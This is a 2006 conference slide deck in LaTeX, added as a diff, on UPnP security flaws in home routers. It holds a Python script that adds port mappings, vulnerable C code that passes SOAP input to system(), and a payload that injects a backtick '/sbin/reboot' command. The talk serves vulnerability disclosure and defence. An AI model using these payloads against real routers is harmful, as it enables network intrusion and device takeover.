@@ -1,0 +1,807 @@
+\documentclass[10pt]{beamer}
+
+\usepackage{url}
+\author{Armijn Hemel}
+\title{Universal Plug and Play - Dead simple or simply deadly?}
+\date{May 18, 2006}
+
+\begin{document}
+
+\setlength{\parskip}{4pt}
+
+\frame{\titlepage}
+
+\section[Universal Plug and Play overview]{}
+
+\frame{
+
+\frametitle{Universal Plug and Play - introduction}
+
+Bring the desktop ``plug and play'' concept to the (local) network. 
+
+Benefits:
+
+\begin{itemize}
+\item no configuration on the part of the user
+\item no installation of software, drivers, etcetera
+\end{itemize}
+
+UPnP is not unique:
+
+\begin{itemize}
+\item JINI (Sun Microsystems)
+\item IETF ZeroConf (Apple ``Bonjour'', KDE, GNOME)
+\end{itemize}
+
+}
+
+\frame{
+
+\frametitle{History of UPnP}
+
+\begin{itemize}
+\item early 1999 as reaction by Microsoft to Sun's JINI
+\item early 2000: first products with UPnP (Windows ME, Intel's Open Source
+UPnP SDK)
+\item Windows ME and Windows XP have UPnP support built-in since their release
+\end{itemize}
+
+Success!! JINI is dead, UPnP is everywhere.
+
+}
+
+\frame{
+
+\frametitle{UPnP standardization}
+
+Various organizations are involved in UPnP:
+
+\begin{itemize}
+\item UPnP Forum: create and publish new UPnP standards.
+\item UPnP Implementers Corporation: UPnP certification and logo licensing.
+\end{itemize}
+
+}
+
+\section[Protocol workings]{Protocol workings}
+
+\frame{
+
+\frametitle{UPnP protocol stack}
+
+\begin{enumerate}
+\setcounter{enumi}{-1}
+\item addressing
+\item discovery
+\item description
+\item control
+\item eventing
+\item presentation
+\end{enumerate}
+}
+
+
+\frame{
+
+\frametitle{UPnP protocol - addressing}
+
+Zeroth, optional, step. If no DHCP server is found use ``auto-addressing'':
+
+\begin{enumerate}
+\item randomly pick an IP address from \url{169.254/16} IP range
+\item if IP address is taken, abandon IP address and goto 1
+\item else keep IP address
+\end{enumerate}
+
+More auto-addressing:
+
+\begin{itemize}
+\item IETF ZeroConf
+\item Fedora Core (has a default route for \url{169.254/16})
+\end{itemize}
+
+}
+
+\begin{frame}[fragile]
+
+\frametitle{UPnP protocol - discovery}
+
+On boot-up send a search request to UDP port 1900 on \url{239.255.255.250}:
+
+\begin{verbatim}
+M-SEARCH * HTTP/1.1
+HOST: 239.255.255.250:1900
+MAN: ssdp:discover
+MX: 10
+ST: ssdp:all
+\end{verbatim}
+
+Other UPnP devices should reply via UDP unicast. Example response (Alcatel
+Speedtouch 510, slightly edited):
+
+\begin{verbatim}
+HTTP/1.1 200 OK
+CACHE-CONTROL:max-age=1800
+EXT:
+LOCATION:http://10.0.0.138:80/IGD.xml
+SERVER:SpeedTouch 510 4.0.0.9.0 UPnP/1.0 (DG233B00011961)
+ST:upnp:rootdevice
+USN:uuid:UPnP-SpeedTouch510-1_00::upnp:rootdevice
+\end{verbatim}
+\end{frame}
+
+\begin{frame}[fragile]
+
+\frametitle{UPnP protocol - discovery (continued)}
+
+Not all devices conform to the standard! Linksys WRT54G/GS remain silent when
+other clients join the network.
+
+Periodically: send notifications to \url{239.255.255.250} on port 1900 UDP
+(Linksys WRT54G output, slightly edited):
+
+\begin{verbatim}
+NOTIFY * HTTP/1.1
+HOST: 239.255.255.250:1900
+CACHE-CONTROL: max-age=180
+Location: http://192.168.1.1:5431/dyndev/uuid:0014-bf09
+NT: upnp:rootdevice
+NTS: ssdp:alive
+SERVER:LINUX/2.4 UPnP/1.0 BRCM400/1.0
+USN: uuid:0014-bf09::upnp:rootdevice
+\end{verbatim}
+
+\end{frame}
+
+\frame{
+
+\frametitle{UPnP protocol - description}
+
+\texttt{LOCATION} points to XML file which describes:
+
+\begin{itemize}
+\item control URL
+\item events URL
+\item SCPD URL (description of which functions are available, in XML)
+\end{itemize}
+
+}
+
+\begin{frame}[fragile]
+
+\frametitle{UPnP protocol - control}
+
+Devices can be controlled by sending SOAP requests to the ``control
+URL'', from XML file of previous step. SOAP wraps function calls in XML,
+sent using HTTP.
+
+\begin{verbatim}
+<s:Envelope
+ xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
+ s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+ <s:Body>
+   <u:GetExternalIPAddress
+     xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
+   </u:GetExternalIPAddress>
+ </s:Body>
+</s:Envelope>
+\end{verbatim}
+
+No authentication/authorization, being on the LAN is enough to do this!!
+
+\end{frame}
+
+\frame{
+
+\frametitle{UPnP protocol - eventing and presentation}
+
+Changes in ``state variables'' are sent over the network to subscribed
+clients.
+
+Clients can subscribe to events, if they provide one or more callback URLs.
+
+Presentation is the human controllable interface: the webinterface of the
+device.
+
+}
+
+\frame{
+
+\frametitle{UPnP profiles}
+
+UPnP defines profiles: a set of actions, state variables, etcetera, that
+implement specific functionality.
+
+Standardized profiles:
+
+\begin{itemize}
+\item Internet Gateway Device (IGD)
+\item MediaServer and MediaRenderer
+\item Printer Device and Print Basic Service
+\item Scanner (External Activity, Feeder, Scan, Scanner)
+\item HVAC
+\item WLAN Access Point Device
+\item and more
+\end{itemize}
+
+Most popular: Internet Gateway Device and (recently) MediaServer and
+MediaRenderer.
+
+}
+
+\frame{
+
+\frametitle{Internet Gateway Device profile}
+
+\begin{itemize}
+\item WAN connection or ADSL modem (ADSL modems and (wireless) routers)
+\item firewall + Network Address Translation
+\item DNS server, DHCP server
+\end{itemize}
+
+Subprofiles:
+
+\begin{itemize}
+\item WANConnectionDevice
+ \begin{itemize}
+  \item WANIPConnection
+  \item WANPPPConnection
+ \end{itemize}
+\item LANHostConfigManagement
+\item Layer3Forwarding
+\item WANCableLinkConfig
+\item WANCommonInterfaceConfig
+\end{itemize}
+
+}
+
+\section[Hacking UPnP]{Hacking UPnP}
+
+\frame{
+
+\frametitle{Hacking the Internet Gateway Device}
+
+The Internet Gateway Device (IGD) is an interesting target:
+
+\begin{itemize}
+\item It controls access to a LAN. Control the IGD and you control the
+connection to the outside world.
+\item Use built-in features from the IGD to get access to interesting machines
+on the LAN.
+\end{itemize}
+}
+
+\frame{
+
+\frametitle{Port forwarding}
+
+The Internet Gateway Device profile allows port forwarding (via
+\texttt{WANIPConnection} or \texttt{WANPPPConnection} subprofiles). Common
+uses:
+
+\begin{enumerate}
+\item ask IGD to add a firewall rule to forward a port on external
+interface of IGD to some port on our machine
+\item ask IGD to add a firewall rule to forward a port on external
+interface of IGD to some port on multicast or broadcast address
+\end{enumerate}
+
+\begin{itemize}
+\item MSN Messenger (``webcam'', file transfers)
+\item remote assistance (Windows XP)
+\item X-Box
+\item many bittorrent clients
+\end{itemize}
+
+}
+
+\frame{
+
+\frametitle{\texttt{WANIPConnection} and \texttt{WANPPPConnection} subprofiles}
+
+\texttt{WANIPConnection} and \texttt{WANPPPConnection} subprofiles control
+portmapping actions:
+
+\begin{itemize}
+\item add a portmapping
+\item delete a portmapping
+\item query existing portmappings
+\end{itemize}
+
+}
+
+\frame{
+
+\frametitle{Port forwarding -- SOAP action}
+
+\texttt{AddPortMapping} SOAP function takes a few arguments:
+
+\begin{itemize}
+\item \texttt{NewRemoteHost} - source of inbound packets, usually empty (i.e.
+all hosts)
+\item \texttt{NewExternalPort} - port on the external interface of the IGD
+\item \texttt{NewProtocol} - protocol of the port mapping (TCP or UDP)
+\item \texttt{NewInternalPort} - port on \texttt{NewInternalClient} packets should be sent to
+\item \texttt{NewInternalClient} - device on the LAN packets should be sent to (or: multicast or broadcast address)
+\item \texttt{NewEnabled} - boolean value indicating if the portmapping should be enabled
+\item \texttt{NewPortMappingDescription} - human readable string describing the portmapping
+\item \texttt{NewLeaseDuration} - value indicating how long the portmapping should be valid
+\end{itemize}
+
+}
+
+\begin{frame}[fragile]
+
+\frametitle{Example code}
+
+\begin{verbatim}
+#! /usr/bin/python
+
+import os
+from SOAPpy import *
+
+endpoint = "http://10.0.0.138/upnp/control/wanpppcpppoa"
+namespace = "urn:schemas-upnp-org:service:WANPPPConnection:1"
+server = SOAPProxy(endpoint, namespace)
+soapaction2 = "urn:schemas-upnp-org:service:WANPPPConnection
+               :1#AddPortMapping"
+
+server._sa(soapaction2).AddPortMapping(NewRemoteHost="",
+           NewExternalPort=5667, NewProtocol="TCP",
+           NewInternalPort=22, NewInternalClient="10.0.0.152",
+           NewEnabled=1,
+           NewPortMappingDescription="evil h4x0r",
+           NewLeaseDuration=0)
+\end{verbatim}
+
+\end{frame}
+
+\frame{
+
+\frametitle{Port forwarding -- protocol unclarities}
+
+UPnP specifications are unclear regarding \texttt{NewInternalClient}.
+
+Page 12 of the specification of \texttt{WANIPConnection} says this about
+\texttt{NewInternalClient}:
+
+\begin{quote}
+``This variable represents the IP address or DNS host name of an internal
+client (on the residential LAN).''
+\end{quote}
+
+On page 13 it says:
+
+\begin{quote}
+``Each 8-tuple configures NAT to listen for packets on the external interface
+of the WANConnectionDevice on behalf of a specific client and dynamically
+forward connection requests to that client.''
+\end{quote}
+
+Question: should \texttt{NewInternalClient} always be the machine the SOAP
+request originates from?
+
+}
+
+\frame{
+
+\frametitle{Port forwarding -- implementation errors}
+
+Question: Can \texttt{NewInternalClient} be set to another internal
+machine?
+
+Answer: In most devices \textit{it can}!
+
+}
+
+\frame{
+
+\frametitle{Impact}
+
+UPnP specifications are very vague on this point!
+
+Open connections to other machines on the LAN:
+
+\begin{itemize}
+\item Windows file server
+\item internal webserver
+\item printer
+\item \dots
+\end{itemize}
+
+}
+
+\frame{
+
+\frametitle{Port forwarding -- implementation errors}
+
+Question: Can \texttt{NewInternalClient} be set to an \textit{external}
+machine?
+
+Answer: In some devices \textit{it can}!
+
+}
+
+\frame{
+
+\frametitle{Port forwarding -- implementation errors}
+
+Some implementations accept a host not on LAN as \texttt{NewInternalClient}.
+Connections to \texttt{NewExternalPort} (IGD external interface) are forwarded
+to \texttt{NewInternalClient} \textit{even if it does not reside on the LAN}.
+
+\begin{itemize}
+\item onion routing (many devices don't log by default!)
+\item reroute traffic: stealing mail, website defacement without hacking,
+phishing (depending on network setup)
+\item \dots
+\end{itemize}
+
+}
+
+\frame{
+
+\frametitle{Vulnerable devices}
+
+\begin{itemize}
+\item possibly anything Linux based from Broadcom
+  \begin{itemize}
+  \item Linksys WRT54G/WRT54GS
+  \item Asus WL-HDD 2.5 (no router, still vulnerable, attack results in DoS)
+  \item maybe more (check OpenWrt website)
+  \end{itemize}
+\item ZyXEL P-335WT
+\item all ``EdiLinux'' based routers (Edimax, Sweex, Hawking, Planet, Canyon,
+Conceptronic, Jaht, \dots). See also
+\url{http://www.linux-mips.org/wiki/Adm5120}
+\url{http://www.linux-mips.org/wiki/Realtek_SOC} (search for routers).
+\end{itemize}
+
+Probably more, but many vendors did not want to cooperate.
+
+US Robotics already fixed this in Broadcom sources for their devices
+in March 2005 but fixes never made it back into the original sources.
+
+More devices for testing welcome!
+
+}
+
+\frame{
+
+\frametitle{Code problems}
+
+Often seen problem: parameter checking.
+
+Input from SOAP request is often passed to an external command or
+\texttt{sysctl} command that just takes whatever value is passed into SOAP.
+
+Inject and execute MIPS/ARM/\dots\ shellcode on the router?
+
+}
+
+\begin{frame}[fragile]
+
+\frametitle{``EdiLinux'' hack}
+
+EdiLinux uses code from \url{http://linux-igd.sourceforge.net/}
+(slightly adapted for readability):
+
+\begin{verbatim}
+int pmlist_AddPortMapping (char *protocol, char *externalPort,
+                           char *internalClient,
+                           char *internalPort) {
+    char command[500];
+    sprintf(command, "%s -t nat -A %s -i %s -p %s -m mport
+          --dport %s -j DNAT --to %s:%s", g_iptables,
+          g_preroutingChainName, g_extInterfaceName, protocol,
+          externalPort, internalClient, internalPort);
+    system (command);
+    if (g_forwardRules) {
+      sprintf(command,"%s -I %s -p %s -d %s -m mport
+         --dport %s -j ACCEPT", g_iptables,g_forwardChainName,
+         protocol, internalClient, internalPort);
+      system(command);
+    }
+    return 1;
+}
+\end{verbatim}
+\end{frame}
+
+\begin{frame}[fragile]
+
+\frametitle{``EdiLinux'' hack -- continued}
+
+There \textit{is} a check for length (heavily edited):
+
+\begin{verbatim}
+struct portMap* pmlist_NewNode(int enabled, int duration,
+         char *remoteHost, char *externalPort,
+         char *internalPort, char *protocol,
+         char *internalClient, char *desc) {
+
+   struct portMap* temp;
+   temp = (struct portMap*) malloc(sizeof(struct portMap));
+   temp->m_PortMappingEnabled = enabled;
+   temp->m_PortMappingLeaseDuration = duration;
+
+   if (strlen(remoteHost) < sizeof(temp->m_RemoteHost))
+              strcpy(temp->m_RemoteHost, remoteHost);
+       else strcpy(temp->m_RemoteHost, "");
+   if (strlen(internalClient) < sizeof(temp->m_InternalClient))
+              strcpy(temp->m_InternalClient, internalClient);
+       else strcpy(temp->m_InternalClient, "");
+   ...
+\end{verbatim}
+
+\end{frame}
+
+\begin{frame}[fragile]
+
+\frametitle{``EdiLinux'' hack -- continued}
+
+\begin{verbatim}
+struct portMap
+{
+   int m_PortMappingEnabled;
+   long int m_PortMappingLeaseDuration;
+   char m_RemoteHost[16];
+   char m_ExternalPort[6];
+   char m_InternalPort[6];
+   char m_PortMappingProtocol[4];
+   char m_InternalClient[16];
+   char m_PortMappingDescription[50];
+
+        struct portMap* next;
+        struct portMap* prev;
+} *pmlist_Head, *pmlist_Tail, *pmlist_Current;
+\end{verbatim}
+
+There is 15 bytes for exploit code!
+
+\end{frame}
+
+\begin{frame}[fragile]
+
+\frametitle{``EdiLinux'' hack -- continued}
+
+The following SOAP code remotely \textit{reboots} the router:
+
+\begin{verbatim}
+server._sa(soapaction2).AddPortMapping(NewRemoteHost="",
+    NewExternalPort=21, NewProtocol="TCP", NewInternalPort=21,
+    NewInternalClient="`/sbin/reboot`", NewEnabled=1,
+    NewPortMappingDescription="blah", NewLeaseDuration=0)
+\end{verbatim}
+
+Remote root exploit for just 30 Euro!
+
+UPnP is by default off on the Edimax BR-6104K.
+
+\end{frame}
+
+\frame{
+
+\frametitle{Reactions from vendors}
+
+Linksys:
+
+\begin{itemize}
+\item Fix has been released for WRT54GS, not (yet) for WRT54G.
+\item Still investigating other devices.
+\end{itemize}
+
+
+Zyxel:
+
+\begin{itemize}
+\item No high priority, UPnP is turned off by default.
+\item Firmware will be patched (eventually). New machines will not have this vulnerability.
+\end{itemize}
+
+
+Edimax:
+
+\begin{itemize}
+\item bug was discovered on May 12. Edimax was informed right away. No response.
+\end{itemize}
+
+Others:
+
+\begin{itemize}
+\item bugs were discovered between May 12 and 15 (by code analysis). Some
+companies were informed (others: no contact address), few responses. Netgear
+and Sitecom are fixing problems.
+\end{itemize}
+
+}
+
+\frame{
+
+\frametitle{Risks and impact}
+
+So what??
+
+Attacks are no remote attacks, but originate from LAN (extra obstacle).
+
+\begin{itemize}
+\item virus, spyware, P2P software, open access points
+\item infected computer is relatively easy to detect, reconfigured
+router is a lot harder to find.
+\end{itemize}
+
+UPnP should be turned off.
+
+\begin{itemize}
+    \item people want to use it
+    \item people don't know how to turn it off, or can't turn it off
+(Speedtouch 510 has no option in webinterface).
+\end{itemize}
+
+Install firmware upgrades!
+
+\begin{itemize}
+\item firmware upgrades are hardly ever installed
+\end{itemize}
+
+}
+
+\frame{
+
+\frametitle{Risks and impact - continued}
+
+\begin{itemize}
+\item millions of UPnP capable routers have been sold and are in use
+\item users don't upgrade router firmware (do you??)
+\item vendors often stop supporting devices after a certain period, if they
+support devices at all! (Especially companies that just rebrand and sell
+devices)
+\end{itemize}
+
+Result: many consumer grade ADSL/cable lines with vulnerable routers and a lot
+of bandwidth to waste. Ouch!
+
+}
+
+\frame{
+
+\frametitle{Fixing UPnP}
+
+Two ways to fix UPnP:
+
+\begin{enumerate}
+\item completely redesign the protocol with security into mind
+\item fix holes in current UPnP implementations
+\end{enumerate}
+
+}
+
+\frame{
+
+\frametitle{Redesign UPnP}
+
+Security has been tried as add-on profiles \texttt{Device Security} and
+\texttt{Security Console}. Never picked up by vendors.
+
+Problem: security is orthogonal to ease of use. Security means configuring
+devices properly: this is hard!
+
+Security doesn't sell, ease of use does!
+
+Combining security and ease of use without compromising any, or both?
+
+Backward compatibility?
+
+}
+
+\frame{
+
+\frametitle{Plumb IGD errors}
+
+Various, relatively straightforward, fixes:
+
+\begin{itemize}
+\item blacklisting/whitelisting devices
+\item always test if \texttt{NewInternalClient} is the requesting machine
+\item verify/validate input!!!
+\end{itemize}
+
+Fixes will not (or hardly) affect users and use of programs and take away
+some threats.
+
+Problems:
+
+\begin{itemize}
+\item vendors need to be willing to fix (development costs)
+\item users need to install fixes
+\end{itemize}
+}
+
+\frame{
+
+\frametitle{Hacking the UPnP A/V profile}
+
+UPnP A/V profile is getting used more and more:
+
+\begin{itemize}
+\item Philips Streamium (some models)
+\item X-Box 360 (limited use)
+\item Noxon Audio
+\item Netgear MP115
+\item many more
+\end{itemize}
+
+Uncharted hacking territory!
+
+}
+
+\frame{
+
+\frametitle{Hacking the UPnP A/V profile}
+
+Two basic types of devices:
+
+\begin{enumerate}
+\item \texttt{MediaServer}
+\item \texttt{MediaRenderer}
+\end{enumerate}
+
+\texttt{MediaServer} streams content, \texttt{MediaRenderer} plays content
+(audio or video). Specifications say both types of devices can be controlled
+by an \textit{external} control point.
+
+}
+
+\frame{
+
+\frametitle{Hacking the UPnP A/V profile}
+
+Possible hacks:
+
+\begin{itemize}
+\item ``steal'' content (DRM protected that was paid for?) from a
+\texttt{MediaServer} by sending it off the LAN.
+\item play content from outside the LAN on a \texttt{MediaRenderer} without
+the user's consent (audio and video spamming).
+\end{itemize}
+
+I have not worked on these hacks yet:
+
+\begin{itemize}
+\item no time (yet)
+\item no devices to test with, except for a Noxon Audio
+\end{itemize}
+
+Devices welcome!
+
+}
+
+
+\section[Conclusion]{Conclusion}
+
+\frame{
+\frametitle{Conclusions}
+
+Universal Plug and Play:
+
+\begin{itemize}
+\item is not very well designed
+\item has ambigious specifications leading to easy to exploit security holes
+\item is everywhere
+\item won't disappear
+\end{itemize}
+
+Just turn it off, hmkay?
+
+}
+
+\frame{
+
+\frametitle{The end...}
+
+\begin{enumerate}
+\item Questions?
+\item Tea!
+\end{enumerate}
+}
+
+\end{document}
